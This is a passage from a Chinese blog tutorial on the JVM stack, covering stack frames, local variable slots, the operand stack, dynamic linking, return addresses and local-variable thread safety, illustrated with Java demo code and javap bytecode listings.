title="（1）栈帧"></a>（1）栈帧</h4><p>栈帧是一个内存区块，是一个数据集，维系着方法执行过程中的各种数据集。</p><p>在一个活动线程中，一个时间点上只可能有一个活动的栈帧，即栈顶栈帧，对应着当前正在运行的方法。</p><pre><code class="java">package net.yury.demo;public class Demo07JVMStackTest &#123;    public static void main(String[] args) &#123;        Demo07JVMStackTest demo = new Demo07JVMStackTest();        demo.test1();    &#125;    public void test1()&#123;        int a = 10;        test2();    &#125;    public void test2()&#123;        int b = 20;        test3();    &#125;    public void test3()&#123;        int c = 30;    &#125;&#125;</code></pre><p>如在运行以上代码时，通过debug手动控制程序的运行时，会发现每当进入一个方法时，下图的顶端方法就会变成当前方法。每执行完一个方法时，顶端方法就会移除。</p><p><img src="/images/stack%E6%B5%8B%E8%AF%95.png"></p><p>注意：不同线程中的所包含的栈帧是不允许存在相互引用的，即不可能在一个栈帧中引用另外一个线程的栈帧。即不同栈之间的栈帧时隔离的。</p><blockquote><p>返回类型</p></blockquote><p>函数有两种返回方式，一是正常返回，而是异常返回。这两种返回方式都会导致栈帧被弹出。</p><p>正常返回时，使用return指令，返回值会被传给下一个栈帧，接着当前栈帧就被JVM丢弃。返回值为void其实也有一个return。</p><p>异常返回时，抛出的异常会传给下一个栈帧去处理，如果下一个栈帧没有处理该异常，则继续往前抛，直到有一个函数可以处理这个异常。</p><blockquote><p>栈帧内部结构</p></blockquote><ul><li><p><font color="Red">局部变量表</font></p></li><li><p><font color="Red">操作数栈（或表达式栈）</font></p></li><li><p>动态链接（或指向运行时常量池的方法引用）</p></li><li><p>方法返回地址（或方法正常退出或异常退出的定义）</p></li><li><p>其他附加信息</p></li></ul><p><img src="/images/%E6%A0%88%E5%B8%A7.png"></p><h4 id="（2）局部变量表"><a href="#（2）局部变量表" class="headerlink" title="（2）局部变量表"></a>（2）局部变量表</h4><p>局部变量表（local variables），<font color="Red">定义为一个数字数组，主要用于存储方法参数和定义在方法体内的局部变量，如字节码指令中的store、load等指令都会对局部变量表的操作</font>，这些数据类型包括基本数据类型、对象引用（reference），以及returnAddress类型。</p><p><font color="Red">局部变量表中最基本的存储单元是slot（变量槽）</font>。32位以内的类型只占用一个slot（包括returnAddress类型），64位的类型（long和double）占用两个slot。</p><ul><li>boolean、byte、short、char在存储之前都会被转换成int，占用一个slot</li><li>float为占用一个字节，故占用一个slot</li><li>long和double则占用两个slot</li><li>引用类型占用一个slot</li></ul><p>局部变量表是和线程绑定的，不存在线程安全的问题。</p><p><strong>局部变量表所需的容量大小是在编译器就确定下来了</strong>，并保存在方法的Code属性的locals数据项中，在方法运行期间是不会改变局部变量表的大小的。</p><p><font color="Red">局部变量表中的变量是重要的垃圾回收的根节点，只要被局部变量表中直接或间接引用的对象都不会被回收。</font></p><p>如下这段代码，在javap命令下展示的局部变量表如下所示。locals即为局部变量表的容量（数字数组的长度），L开头表示引用类型。</p><pre><code class="java">package net.yury.demo;public class Demo08Slot &#123;    public static void main(String[] args) &#123;        String res = test(args);    &#125;    public static String test(String[] args)&#123;        long a = 1L;        double b = 2;        float c = 3F;        int d = 3;        short e = 4;        byte f = 5;        boolean g = true;        char h = &#39;a&#39;;        String i = &quot;123&quot;;        return i + &quot;456&quot;;    &#125;&#125;/*public static java.lang.String test(java.lang.String[]);    descriptor: ([Ljava/lang/String;)Ljava/lang/String;    flags: ACC_PUBLIC, ACC_STATIC    Code:      stack=2, locals=12, args_size=1         0: lconst_1         1: lstore_1         2: ldc2_w        #3                  // double 2.0d         5: dstore_3         6: ldc           #5                  // float 3.0f         8: fstore        5        10: iconst_3        11: istore        6        13: iconst_4        14: istore        7        16: iconst_5        17: istore        8        19: iconst_1        20: istore        9        22: bipush        97        24: istore        10        26: ldc           #6                  // String 123        28: astore        11        30: new           #7                  // class java/lang/StringBuilder        33: dup        34: invokespecial #8                  // Method java/lang/StringBuilder.&quot;&lt;init&gt;&quot;:()V        37: aload         11        39: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;        42: ldc           #10                 // String 456        44: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;        47: invokevirtual #11                 // Method java/lang/StringBuilder.toString:()Ljava/lang/String;        50: areturn      LineNumberTable:        line 8: 0        line 9: 2        line 10: 6        line 11: 10        line 12: 13        line 13: 16        line 14: 19        line 15: 22        line 16: 26        line 17: 30      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      51     0  args   [Ljava/lang/String;            2      49     1     a   J            6      45     3     b   D           10      41     5     c   F           13      38     6     d   I           16      35     7     e   S           19      32     8     f   B           22      29     9     g   Z           26      25    10     h   C           30      21    11     i   Ljava/lang/String;*/</code></pre><p>局部变量表在LocalVariableTable下，</p><ul><li>start：该局部变量开始生效的字节码行号</li><li>length：该局部变量开始生效的字节码行的数量，start + length一定等于该方法的总字节码行数</li><li>slot：占据的槽位的编号</li><li>name：局部变量名</li><li>signature：局部变量类型缩写</li></ul><p>最上面<code>Code：</code>下面的<code>locals</code>即为局部变量表的大小，而<code>stack</code>为操作数栈的长度。</p><p>LineNumberTable这个表指的是<strong>源代码中行号（冒号左边）</strong>和<strong>字节码行号（冒号右边）</strong>的对应关系</p><p><img src="/images/%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8.png"></p><p><font color="Red">注意：非静态方法，会把对自身对象的引用this放在第0个位置的slot处作为“局部变量”，甚至方法的参数都要放在这个“局部变量”后面。而静态方法中，不会将自身对象的应用放到局部变量表中，因此在静态方法中使用this会报错。如下：</font></p><pre><code class="java">public String test1(long i) throws FileNotFoundException &#123;    FileInputStream fileInputStream = new FileInputStream(&quot;&quot;);    this.test2();    return this.name;&#125;/*public java.lang.String test1(long) throws java.io.FileNotFoundException;    descriptor: (J)Ljava/lang/String;    flags: ACC_PUBLIC    Code:      stack=3, locals=4, args_size=2         0: new           #12                 // class java/io/FileInputStream         3: dup         4: ldc           #13                 // String         6: invokespecial #14                 // Method java/io/FileInputStream.&quot;&lt;init&gt;&quot;:(Ljava/lang/String;)V         9: astore_3        10: aload_0        11: invokevirtual #15                 // Method test2:()V        14: aload_0        15: getfield      #16                 // Field name:Ljava/lang/String;        18: areturn      LineNumberTable:        line 21: 0        line 22: 10        line 23: 14      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      19     0  this   Lnet/yury/demo/Demo09Method;            0      19     1     i   J           10       9     3 fileInputStream   Ljava/io/FileInputStream;    Exceptions:      throws java.io.FileNotFoundException*/</code></pre><blockquote><p>slot的重复利用</p></blockquote><p>局部变量表中的slot槽位是可以重复利用的。当一个局部变量过了其作用域时，那么后面申明的局部变量可以利用前面过期的局部变量的slot槽位，以达到节省资源的作用。</p><p>如下，c和d利用了过期了的b的slot槽位。</p><pre><code class="java">public void test3()&#123;    int a = 0;    &#123;        long b = 100L;        b = a;    &#125;    int c = 0;    char d = &#39;a&#39;;&#125;/*public void test3();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=2, locals=4, args_size=1         0: iconst_0         1: istore_1         2: ldc2_w        #4                  // long 100l         5: lstore_2         6: iload_1         7: i2l         8: lstore_2         9: iconst_0        10: istore_2        11: bipush        97        13: istore_3        14: return      LineNumberTable:        line 31: 0        line 33: 2        line 34: 6        line 36: 9        line 37: 11        line 38: 14      LocalVariableTable:        Start  Length  Slot  Name   Signature            6       3     2     b   J            0      15     0  this   Lnet/yury/demo/Demo09Method;            2      13     1     a   I           11       4     2     c   I           14       1     3     d   C*/</code></pre><h4 id="（3）操作数栈"><a href="#（3）操作数栈" class="headerlink" title="（3）操作数栈"></a>（3）操作数栈</h4><p><font color="Red">操作数栈（operand stack），即在方法执行过程中，根据字节码指令，往栈中写入数据或提取数据的一个临时存储空间，主要用于保存一些指令需要用的临时数据。</font>如指令中的push、store、load等指令，都会对操作数栈进行操作。</p><p>JVM的执行引擎是基于栈的执行引擎，其中这里说的栈，就是操作数栈。</p><p>JVM操作数栈用数组来实现，操作数栈的大小在编译时即确定了，对操作数栈的操作只有入栈和出栈。</p><p>操作数栈中的任何一个元素的都可以是任意类型的java数据类型，只是占用的栈单位不一样：</p><ul><li>32位及以下的类型占用一个栈单位深度，以int类型存放</li><li>64位类型占用两个栈单位深度</li></ul><blockquote><p>指令分析</p></blockquote><pre><code class="java">package net.yury.demo;public class Demo10OperandStack &#123;    public void method1() &#123;        byte m = 15;        int n = 8;        int k = m + n;    &#125;&#125;</code></pre><pre><code class="java">public void method1();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=2, locals=4, args_size=1         0: bipush        15         2: istore_1         3: bipush        8         5: istore_2         6: iload_1         7: iload_2         8: iadd         9: istore_3        10: return      LineNumberTable:        line 5: 0        line 6: 3        line 7: 6        line 8: 10      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      11     0  this   Lnet/yury/demo/Demo10OperandStack;            3       8     1     m   B            6       5     2     n   I           10       1     3     k   I</code></pre><p>以上指令是如何一步一步进行的，如下图所示：</p><p><img src="/images/%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4%E5%88%86%E6%9E%90.png"></p><p><font color="Red">注意：对于<code>int n = 8;</code>这段代码，虽然指定的是int型，但是数值不超过byte的范围，所以编译后的类型是byte。即并不是我们指定什么类型，它就是什么类型，前端编译器会对我们的代码做优化。</font></p><p>对于有返回值的函数，调用这个函数时，会将函数结果压入栈顶，如下所示。sum方法和上面的method方法的指令，除了ireturn有区别外，其他均无区别。getSum方法的指令中，<font color="Red"><code>aload_0</code>是将this自身对应的引用从局部变量表中复制出来，放入操作数栈中；<code>invokevirtual</code>指令则是取出栈顶元素，以该元素为对象，调用对象中的一个方法，返回的结果会被重新压入栈顶；<code>istore_1</code>则是将栈顶元素出栈，即取出刚才的函数返回值，放入局部变量表中的1号slot槽位。</font></p><pre><code class="java">public void getSum()&#123;    int a = sum();    int b = 10000;&#125;public int sum()&#123;    byte m = 15;    int n = 8;    int k = m + n;    return k;&#125;</code></pre><pre><code class="java">public void getSum();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=1, locals=3, args_size=1         0: aload_0         1: invokevirtual #2                  // Method sum:()I         4: istore_1         5: sipush        10000         8: istore_2         9: return      LineNumberTable:        line 11: 0        line 12: 5        line 13: 9      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      10     0  this   Lnet/yury/demo/Demo10OperandStack;            5       5     1     a   I            9       1     2     b   I  public int sum();    descriptor: ()I    flags: ACC_PUBLIC    Code:      stack=2, locals=4, args_size=1         0: bipush        15         2: istore_1         3: bipush        8         5: istore_2         6: iload_1         7: iload_2         8: iadd         9: istore_3        10: iload_3        11: ireturn      LineNumberTable:        line 16: 0        line 17: 3        line 18: 6        line 19: 10      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      12     0  this   Lnet/yury/demo/Demo10OperandStack;            3       9     1     m   B            6       6     2     n   I           10       2     3     k   I</code></pre><blockquote><p>i++与++i的区别</p></blockquote><p>先通过字节码分析，可以发现，<code>n++</code>是先将数据从局部变量表中复制到操作数栈中，再对局部变量表中slot为1的变量的值进行++操作，最后将操作数栈中栈顶元素store到新的局部变量中，而<code>++n</code>是先在局部变量表中slot为1的变量的值进行++操作，再load到操作数栈中，最后store到新的局部变量中。即load和++操作的执行顺序不一样，这就导致n++返回的是n，而++n返回的是(n+1)。</p><pre><code class="java">public void test()&#123;    int n = 1000;    int m = n++;    int k = ++n;&#125;</code></pre><pre><code class="java">public void test();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=1, locals=4, args_size=1         0: sipush        1000         3: istore_1         4: iload_1         5: iinc          1, 1         8: istore_2         9: iinc          1, 1        12: iload_1        13: istore_3        14: return      LineNumberTable:        line 23: 0        line 24: 4        line 25: 9        line 26: 14      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      15     0  this   Lnet/yury/demo/Demo10OperandStack;            4      11     1     n   I            9       6     2     m   I           14       1     3     k   I</code></pre><blockquote><p>栈顶缓存技术（top-of-stack caching）</p></blockquote><p>由于JVM是基于栈设计的，因此在不断的执行指令过程中，经常会有入栈出栈的操作，这就意味着存在多次的内存读写操作，会对整体运行速度有所影响。因此HotSpot JVM对此处做了一个缓存，即<font color="Red">将所有栈顶元素缓存到物理CPU寄存器中，依次降低对内存的读写，提高执行效率。</font></p><p>CPU还有一个东西叫高速缓存（一级、二级、三级），这个东西是集成到CPU内和CPU完全独立的一个器件，作为CPU的临时数据缓存区。而CPU寄存器是属于CPU本身的，因此CPU对寄存器的读写速度比对高速缓存的读写速度快得多。这一块是硬件相关的东西，不同架构的硬件设计不一样，可以去学习学习。</p><h4 id="（4）动态链接"><a href="#（4）动态链接" class="headerlink" title="（4）动态链接"></a>（4）动态链接</h4><p>之前说过，每个栈帧都对应一个方法的执行，那么JVM怎么知道这个栈帧是对应的哪个方法呢，这就是通过动态链接来实现的。</p><p>每个栈帧中都包含了一个指向运行时常量池中的该栈帧对应的方法类型的引用，这样字节码文件中的指令就可以支持使用动态链接。</p><p><font color="Red">动态链接（Dynamic Linking），将符号方法引用转换为直接方法引用，加载符号引用对应的类，将对变量的访问转换为这些变量在对应的存储结构中的对应的偏移量。</font></p><p>java代码被编译成字节码指令后，所有的类、变量和方法都保存在运行时常量池中，并都指定了一个通过#开头的独一无二的符号引用作为这个变量或方法的引用。<font color="Red">动态链接就是将这个符号引用转换为直接引用，从而实现方法的调用、类的加载和变量的使用。</font></p><p>比如下面这个类的运行时常量池和test()方法的字节码。运行时常量池中记录了这个类所需要的字节码对象，左边的#加数字即为对应的符号引用，test()方法中的指令需要用到某个对象时，则使用这个引用即可。</p><p>JVM的运行时常量池可以把其他字节码文件中的对象在本字节码文件中设置引用，但动态链接只能链接本字节码文件中运行时常量池中包含的对象，无法直接链接到外部字节码文件的对象。</p><pre><code class="java">package net.yury.demo;public class Demo11DynamicLinking &#123;    public static void main(String[] args) &#123;        new Demo11DynamicLinking().test();    &#125;    public void test(int i)&#123;    &#125;    public void test()&#123;        String test = Demo08Slot.test(null);        Demo10OperandStack demo = new Demo10OperandStack();        demo.test();        test(10);        System.out.println(test);    &#125;&#125;</code></pre><pre><code class="java">Constant pool:   #1 = Methodref          #14.#36        // java/lang/Object.&quot;&lt;init&gt;&quot;:()V   #2 = Class              #37            // net/yury/demo/Demo11DynamicLinking   #3 = Methodref          #2.#36         // net/yury/demo/Demo11DynamicLinking.&quot;&lt;init&gt;&quot;:()V   #4 = Methodref          #2.#38         // net/yury/demo/Demo11DynamicLinking.test:()V   #5 = Class              #39            // java/lang/String   #6 = String             #40            // 123456   #7 = Methodref          #41.#42        // net/yury/demo/Demo08Slot.test:([Ljava/lang/String;)Ljava/lang/String;   #8 = Class              #43            // net/yury/demo/Demo10OperandStack   #9 = Methodref          #8.#36         // net/yury/demo/Demo10OperandStack.&quot;&lt;init&gt;&quot;:()V  #10 = Methodref          #8.#38         // net/yury/demo/Demo10OperandStack.test:()V  #11 = Methodref          #2.#44         // net/yury/demo/Demo11DynamicLinking.test:(I)V  #12 = Fieldref           #45.#46        // java/lang/System.out:Ljava/io/PrintStream;  #13 = Methodref          #47.#48        // java/io/PrintStream.println:(Ljava/lang/String;)V  #14 = Class              #49            // java/lang/Object  #15 = Utf8               &lt;init&gt;  #16 = Utf8               ()V  #17 = Utf8               Code  #18 = Utf8               LineNumberTable  #19 = Utf8               LocalVariableTable  #20 = Utf8               this  #21 = Utf8               Lnet/yury/demo/Demo11DynamicLinking;  #22 = Utf8               main  #23 = Utf8               ([Ljava/lang/String;)V  #24 = Utf8               args  #25 = Utf8               [Ljava/lang/String;  #26 = Utf8               test  #27 = Utf8               (I)V  #28 = Utf8               i  #29 = Utf8               I  #30 = Utf8               testString  #31 = Utf8               Ljava/lang/String;  #32 = Utf8               demo  #33 = Utf8               Lnet/yury/demo/Demo10OperandStack;  #34 = Utf8               SourceFile  #35 = Utf8               Demo11DynamicLinking.java  #36 = NameAndType        #15:#16        // &quot;&lt;init&gt;&quot;:()V  #37 = Utf8               net/yury/demo/Demo11DynamicLinking  #38 = NameAndType        #26:#16        // test:()V  #39 = Utf8               java/lang/String  #40 = Utf8               123456  #41 = Class              #50            // net/yury/demo/Demo08Slot  #42 = NameAndType        #26:#51        // test:([Ljava/lang/String;)Ljava/lang/String;  #43 = Utf8               net/yury/demo/Demo10OperandStack  #44 = NameAndType        #26:#27        // test:(I)V  #45 = Class              #52            // java/lang/System  #46 = NameAndType        #53:#54        // out:Ljava/io/PrintStream;  #47 = Class              #55            // java/io/PrintStream  #48 = NameAndType        #56:#57        // println:(Ljava/lang/String;)V  #49 = Utf8               java/lang/Object  #50 = Utf8               net/yury/demo/Demo08Slot  #51 = Utf8               ([Ljava/lang/String;)Ljava/lang/String;  #52 = Utf8               java/lang/System  #53 = Utf8               out  #54 = Utf8               Ljava/io/PrintStream;  #55 = Utf8               java/io/PrintStream  #56 = Utf8               println  #57 = Utf8               (Ljava/lang/String;)V  public void test();    descriptor: ()V    flags: ACC_PUBLIC    Code:      stack=4, locals=4, args_size=1         0: iconst_1         1: anewarray     #5                  // class java/lang/String         4: dup         5: iconst_0         6: ldc           #6                  // String 123456         8: aastore         9: astore_1        10: aload_1        11: invokestatic  #7                  // Method net/yury/demo/Demo08Slot.test:([Ljava/lang/String;)Ljava/lang/String;        14: astore_2        15: new           #8                  // class net/yury/demo/Demo10OperandStack        18: dup        19: invokespecial #9                  // Method net/yury/demo/Demo10OperandStack.&quot;&lt;init&gt;&quot;:()V        22: astore_3        23: aload_3        24: invokevirtual #10                 // Method net/yury/demo/Demo10OperandStack.test:()V        27: aload_0        28: bipush        10        30: invokevirtual #11                 // Method test:(I)V        33: getstatic     #12                 // Field java/lang/System.out:Ljava/io/PrintStream;        36: aload_2        37: invokevirtual #13                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V        40: return      LineNumberTable:        line 16: 0        line 17: 10        line 18: 15        line 19: 23        line 20: 27        line 21: 33        line 22: 40      LocalVariableTable:        Start  Length  Slot  Name   Signature            0      41     0  this   Lnet/yury/demo/Demo11DynamicLinking;           10      31     1 testString   [Ljava/lang/String;           15      26     2  test   Ljava/lang/String;           23      18     3  demo   Lnet/yury/demo/Demo10OperandStack;</code></pre><blockquote><p>早期绑定和晚期绑定</p></blockquote><p><strong>绑定</strong>是一个字段、方法或类在符号引用被转换成直接引用的过程。</p><p><strong>早期绑定</strong>：如果被调用的目标的类型在编译期间就是确定的，且运行期间保持不变，则这个目标的绑定过程叫早期绑定。</p><p><strong>晚期绑定</strong>：如果被调用的目标的类型在编译期间无法确定，只能在运行期间确定，则这个目标的绑定过程叫晚期绑定。</p><p>对于方法而言，有早期绑定和晚期绑定又叫静态链接和动态链接。</p><p><strong>静态链接</strong>：如果被调用的方法类型在编译期间就是确定下来的，并且运行期间保持不变，这种情况下将调用的方法的符号引用转换为直接引用的过程叫静态链接。</p><p><strong>动态链接</strong>：如果被调用的方法类型在编译期间无法确定，只能在运行期间将调用的方法的符号引用转换为直接引用，这个过程叫动态链接。</p><blockquote><p>虚方法和非虚方法</p></blockquote><p><strong>虚方法</strong>：编译期间无法确定的方法叫虚方法；</p><p><strong>非虚方法</strong>：编译期间就可以确定，且运行期间无法修改的方法，叫非需方法。</p><p>虚方法的调用使用在字节码层面会使用invokevirtual和invokeinterface两个指令；而非虚方法的调用在字节码层面使用invokestatic和invokespecial指令。final方法外除外，final方法的调用仍然使用invokevirtual指令。</p><ul><li>invokestatic：调用静态方法</li><li>invokespecial：调用父类方法、私有方法、构造器方法</li><li>invokevirtual：调用其他普通方法或final方法</li><li>invokeinterface：调用接口方法</li><li>invokedynamic：使用函数式接口或lamdba表达式生成一个对象时使用的指令</li></ul><p>不同方法的调用使用的字节码指令如下。值得注意的是，下面这段代码中，Function接口通过lamdba表达式和new的方式使用的底层指令不一样，lamdba使用invokedynamic，而new实际上是生成了一个匿名内部类<code>Demo12DynamicLinking2$1</code>，并初始化这个匿名内部类，因此使用了invokespecial。</p><pre><code class="java">package net.yury.demo;import java.util.function.Function;public class Demo12DynamicLinking2 extends Parent implements Interface&#123;    public static void main(String[] args) &#123;    &#125;    public static void test1()&#123; &#125;    private void test2()&#123; &#125;    public void test3()&#123; &#125;    protected void test4()&#123; &#125;    public final void test5()&#123; &#125;    @Override    public void test6()&#123; System.out.println(&quot;child&quot;); &#125;    public final void test7()&#123; &#125;    @Override    public void test8()&#123; &#125;    public void method(Interface demo)&#123;        test1();        test2();        test3();        test4();        test5();        test6();        super.test6();        test7();        test8();        demo.test8();        Function&lt;String, String&gt; function1 = s -&gt; &#123; return s; &#125;;        Function&lt;String, String&gt; function2 = new Function&lt;String, String&gt;() &#123;            @Override            public String apply(String s) &#123;                return s;            &#125;        &#125;;        String s1 = function1.apply(&quot;123&quot;);        String s2 = function2.apply(&quot;456&quot;);    &#125;&#125;interface Interface&#123;    public void test8();&#125;class Parent&#123;    public void test6()&#123;        System.out.println(&quot;parent&quot;);    &#125;&#125;</code></pre><pre><code class="java">      stack=3, locals=6, args_size=2         0: invokestatic  #5                  // Method test1:()V         3: aload_0         4: invokespecial #6                  // Method test2:()V         7: aload_0         8: invokevirtual #7                  // Method test3:()V        11: aload_0        12: invokevirtual #8                  // Method test4:()V        15: aload_0        16: invokevirtual #9                  // Method test5:()V        19: aload_0        20: invokevirtual #10                 // Method test6:()V        23: aload_0        24: invokespecial #11                 // Method net/yury/demo/Parent.test6:()V        27: aload_0        28: invokevirtual #12                 // Method test7:()V        31: aload_0        32: invokevirtual #13                 // Method test8:()V        35: aload_1        36: invokeinterface #14,  1           // InterfaceMethod net/yury/demo/Interface.test8:()V        41: invokedynamic #15,  0             // InvokeDynamic #0:apply:()Ljava/util/function/Function;        46: astore_2        47: new           #16                 // class net/yury/demo/Demo12DynamicLinking2$1        50: dup        51: aload_0        52: invokespecial #17                 // Method net/yury/demo/Demo12DynamicLinking2$1.&quot;&lt;init&gt;&quot;:(Lnet/yury/demo/Demo12DynamicLinking2;)V        55: astore_3        56: aload_2        57: ldc           #18                 // String 123        59: invokeinterface #19,  2           // InterfaceMethod java/util/function/Function.apply:(Ljava/lang/Object;)Ljava/lang/Object;        64: checkcast     #20                 // class java/lang/String        67: astore        4        69: aload_3        70: ldc           #21                 // String 456        72: invokeinterface #19,  2           // InterfaceMethod java/util/function/Function.apply:(Ljava/lang/Object;)Ljava/lang/Object;        77: checkcast     #20                 // class java/lang/String        80: astore        5        82: return</code></pre><blockquote><p>继承和方法重写的本质</p></blockquote><p>java的类可能会有继承关系，而调用一个子类的方法时，JVM怎么知道这个方法是子类重写的方法，还是父类的方法呢。JVM会在编译期做以下操作。</p><ol><li>将该方法所属的对象引用加载到操作数栈（如果调用静态方法则省略这一步）</li><li>找到操作数栈栈顶的第一个元素所执行的对象的实际类型，记作 C</li><li>如果在运行时常量池的类型C中找到参数和返回值类型都和调用的方法相同的方法，则再进行权限校验，如果通过则返回这个方法的直接引用，如果权限校验不通过，则返回java.lang.IllegalAccessError异常；</li><li>如果没找到类型C中没找到这种方法，则按照类继承关系依次往父类执行第3步查找和权限校验。</li><li>如果最终无法正常返回一个方法的直接引用，则抛出异常。</li></ol><p>因此如果子类有这个方法则调用的是子类的方法，如果没有，则调用的是第一个有该方法的父类方法。</p><h4 id="（5）方法返回地址"><a href="#（5）方法返回地址" class="headerlink" title="（5）方法返回地址"></a>（5）方法返回地址</h4><p>正常返回：<font color="Red">方法返回地址存放调用该方法的pc寄存器的值，即返回下一条将要执行的指令的地址。</font></p><p>异常返回：通过异常表来确定，栈帧中一般不保存这部分信息。</p><p>方法返回的本质：</p><ul><li>当前栈帧出栈</li><li>返回到上层方法的局部变量表、操作数栈，将当前方法的返回值压入操作数栈（如果上层方法要使用的话）</li><li>设置pc寄存器的值</li></ul><p>return指令根据返回值类型的不同分为以下几种：</p><ul><li>return：返回void</li><li>ireturn：返回32位的类型，如boolean、byte、short、char、int</li><li>dreturn：返回double</li><li>freturn：返回float</li><li>lreturn：返回long</li><li>areturn：返回引用类型，如所有的类</li></ul><p>异常处理表：</p><p>从<code>from</code>这一行字节码开始，到<code>to</code>这一行字节码，如果出现了<code>type</code>类型，则从<code>target</code>行指令继续执行。如下Exception table所示。</p><pre><code class="java">package net.yury.demo;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.util.Arrays;public class Demo09Method &#123;    private String name;    public static void main(String[] args) &#123;        Demo09Method demo = new Demo09Method();        String s;        try&#123;            s = demo.test1(100L);            System.out.println(s);        &#125;catch (FileNotFoundException ex)&#123;            System.out.println(Arrays.toString(ex.getStackTrace()));        &#125;    &#125;&#125;</code></pre><pre><code class="java">  public static void main(java.lang.String[]);    descriptor: ([Ljava/lang/String;)V    flags: ACC_PUBLIC, ACC_STATIC    Code:      stack=3, locals=4, args_size=1         0: new           #2                  // class net/yury/demo/Demo09Method         3: dup         4: invokespecial #3                  // Method &quot;&lt;init&gt;&quot;:()V         7: astore_1         8: aload_1         9: ldc2_w        #4                  // long 100l        12: invokevirtual #6                  // Method test1:(J)Ljava/lang/String;        15: astore_2        16: getstatic     #7                  // Field java/lang/System.out:Ljava/io/PrintStream;        19: aload_2        20: invokevirtual #8                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V        23: goto          40        26: astore_3        27: getstatic     #7                  // Field java/lang/System.out:Ljava/io/PrintStream;        30: aload_3        31: invokevirtual #10                 // Method java/io/FileNotFoundException.getStackTrace:()[Ljava/lang/StackTraceElement;        34: invokestatic  #11                 // Method java/util/Arrays.toString:([Ljava/lang/Object;)Ljava/lang/String;        37: invokevirtual #8                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V        40: return      Exception table:         from    to  target type             8    23    26   Class java/io/FileNotFoundException      LineNumberTable:        line 10: 0        line 13: 8        line 14: 16        line 17: 23        line 15: 26        line 16: 27        line 18: 40</code></pre><h4 id="（6）一些附加信息"><a href="#（6）一些附加信息" class="headerlink" title="（6）一些附加信息"></a>（6）一些附加信息</h4><p>略。</p><h4 id="（7）问题"><a href="#（7）问题" class="headerlink" title="（7）问题"></a>（7）问题</h4><blockquote><p>栈相关的报错有哪些？</p></blockquote><p>stackoverflow，栈溢出，方法调用的次数太多以致于栈耗费的空间超过了我们设置的栈大小，可以通过修改-Xss设置栈大小。</p><p>outofmemory，内存不足，栈空间设置足够大，但是方法调用过多，导致整体内存不足。（OOM很少出现在栈空间发生）</p><blockquote><p>调整栈空间大小，可以保证不出现溢出吗？</p></blockquote><p>不能。若使用固定大小的栈，即使调整了栈空间大小，他也是确定的；而程序方法的调用如在出现递归的情况下，调用次数是不确定的，有可能会出现栈溢出的情况。</p><blockquote><p>分配栈空间内存越大越好吗？</p></blockquote><p>服务器资源是有效的，栈空间内存分配越大，则其他资源（如堆）分配到的空间就受限。应根据服务器和应用程序的实际情况分配。</p><blockquote><p>垃圾回收会设计到栈空间吗？</p></blockquote><p>不会，栈没有垃圾回收。</p><blockquote><p>java对象一定都是在对空间上创建的吗？</p></blockquote><p>不一定，栈也可以创建对象。堆那边再聊。</p><blockquote><p><font color="Red">局部变量是线程安全的吗？</font></p></blockquote><p>若该局部变量是方法内部产生，且方法内部销毁的，则这个局部变量是线程安全的。</p><p>若该局部变量以参数形式传入方法，或者作为返回值返回出去的，则这个局部变量是线程不安全的。</p><p><strong>即只要这个局部变量的生命周期完全在这个方法内，则是线程安全的；否则是线程不安全的。</strong></p><p>一个对象的指针或引用被多个方法或线程使用，即称这个对象出现了<strong>逃逸</strong>（Escape）。全局变量如类属性和私有属性可能会被多个方法或线程使用，这种线程安全问题很常见；而局部变量如果其作用域不仅限于该方法，还被其他方法或线程使用了，即出现了逃逸，则也可能会存在线程安全问题。具体见后面的<strong>逃逸分析</strong>。</p><p>最稳妥的方式是，避免局部变量逃逸到其他方法或线程中，如</p><ul><li>方法参数尽量使用线程安全的对象，或者不可变对象（如String），或者使用私有属性的方式代替传入参数的形式来定义方法。</li><li>避免将局部变量作为方法返回值，或者以一个线程安全的或不可变的对象的形式返回（如返回<code>StringBuilder.ToString()</code>）。</li><li>坚守一个原则：对象的作用域尽量维持在使用它的最小作用域</li></ul><pre><code class="java">package net.yury.demo;public class Demo13ThreadSafe &#123;    public static void main(String[] args) throws InterruptedException &#123;        method2();    &#125;    public static void method1() throws InterruptedException &#123;        StringBuilder sb = new StringBuilder();        new Thread(() -&gt; &#123;            for (int i = 0; i &lt; 10000; i++) &#123;                sb.append(&#39;a&#39;);            &#125;        &#125;).start();        new Thread(() -&gt; add(sb)).start();        Thread.sleep(1000);        System.out.println(sb.toString());    &#125;    public static void add(StringBuilder sb)&#123;        for (int i = 0; i &lt;10000; i++) &#123;            sb.append(&#39;b&#39;);        &#125;    &#125;    public static void method2() throws InterruptedException &#123;        StringBuilder sb = add2();        new Thread(() -&gt; &#123;            for (int i = 0; i &lt; 10000; i++) &#123;                sb.append(&#39;1&#39;);            &#125;        &#125;).start();        new Thread(() -&gt; &#123;            for (int i = 0; i &lt; 10000; i++) &#123;                sb.append(&#39;2&#39;);            &#125;        &#125;).start();        Thread.sleep(1000);        System.out.println(sb.toString());    &#125;    public static StringBuilder add2()&#123;        StringBuilder sb = new StringBuilder();        sb.append(&quot;abc&quot;);        return sb;    &#125;&#125;</code></pre><h3 id="5、本地方法栈"><a href="#5、本地方法栈" class="headerlink" title="5、本地方法栈"></a>5、本地方法栈</h3><p><font color="Red">本地方法栈（Nativa Method 